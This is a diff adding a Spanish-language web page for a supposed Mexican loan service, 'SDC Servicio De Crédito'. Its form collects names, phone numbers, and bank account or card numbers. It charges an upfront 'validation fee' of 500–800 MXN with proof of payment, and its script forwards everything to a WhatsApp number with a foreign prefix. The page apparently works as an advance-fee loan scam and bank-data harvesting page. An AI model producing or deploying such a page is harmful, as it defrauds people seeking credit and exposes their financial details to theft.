@@ -1,0 +1,137 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SDC - Registro de Solicitud</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      color: #001f5b;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #001f5b;
+      padding: 20px;
+      text-align: center;
+      color: white;
+    }
+    .container {
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+    h2 {
+      color: #001f5b;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #001f5b;
+      color: white;
+      padding: 10px 15px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .info-box {
+      background: #f0f4ff;
+      padding: 15px;
+      border: 1px solid #001f5b;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>SDC Servicio De Crédito</h1>
+    <p>Registro de Solicitud de Préstamo</p>
+  </header>
+
+  <div class="container">
+    <h2>Formulario de Registro</h2>
+    <form id="registro-form">
+      <label for="nombre">Nombre completo:</label>
+      <input type="text" id="nombre" name="nombre" required />
+
+      <label for="telefono">WhatsApp / Teléfono:</label>
+      <input type="tel" id="telefono" name="telefono" required />
+
+      <label for="monto">Monto del préstamo solicitado (en MXN):</label>
+      <input type="number" id="monto" name="monto" required />
+
+      <label for="banco">Nombre del banco:</label>
+      <input type="text" id="banco" name="banco" required />
+
+      <label for="cuenta">Número de cuenta o tarjeta:</label>
+      <input type="text" id="cuenta" name="cuenta" required />
+
+      <label for="pais">País:</label>
+      <input type="text" id="pais" name="pais" required />
+
+      <div class="info-box" id="tarifa-box">
+        <strong>Tarifa de validación:</strong> <span id="tarifa">-</span> MXN
+      </div>
+
+      <label for="comprobante">Subir comprobante de pago:</label>
+      <input type="file" id="comprobante" name="comprobante" accept="image/*" required />
+
+      <button type="submit">Registrar mi expediente</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById("registro-form");
+    const montoInput = document.getElementById("monto");
+    const tarifaBox = document.getElementById("tarifa");
+
+    montoInput.addEventListener("input", () => {
+      const monto = parseFloat(montoInput.value);
+      if (monto >= 3000 && monto <= 15000) {
+        tarifaBox.textContent = "500";
+      } else if (monto > 15000) {
+        tarifaBox.textContent = "800";
+      } else {
+        tarifaBox.textContent = "-";
+      }
+    });
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const nombre = form.nombre.value;
+      const telefono = form.telefono.value;
+      const monto = form.monto.value;
+      const banco = form.banco.value;
+      const cuenta = form.cuenta.value;
+      const pais = form.pais.value;
+      const tarifa = tarifaBox.textContent;
+      const comprobante = form.comprobante.files[0];
+
+      const mensaje = `📄 *Nuevo registro de expediente - SDC*\n\n👤 Nombre: ${nombre}\n📱 WhatsApp: ${telefono}\n💰 Monto solicitado: ${monto} MXN\n🏦 Banco: ${banco}\n💳 Cuenta: ${cuenta}\n🌍 País: ${pais}\n💸 Tarifa aplicada: ${tarifa} MXN`;
+
+      const whatsappURL = `https://wa.me/22950001045?text=${encodeURIComponent(mensaje)}`;
+
+      window.open(whatsappURL, '_blank');
+
+      alert("Su expediente ha sido registrado correctamente. Nuestro equipo lo validará en breve.");
+      form.reset();
+      tarifaBox.textContent = "-";
+    });
+  </script>
+</body>
+</html>
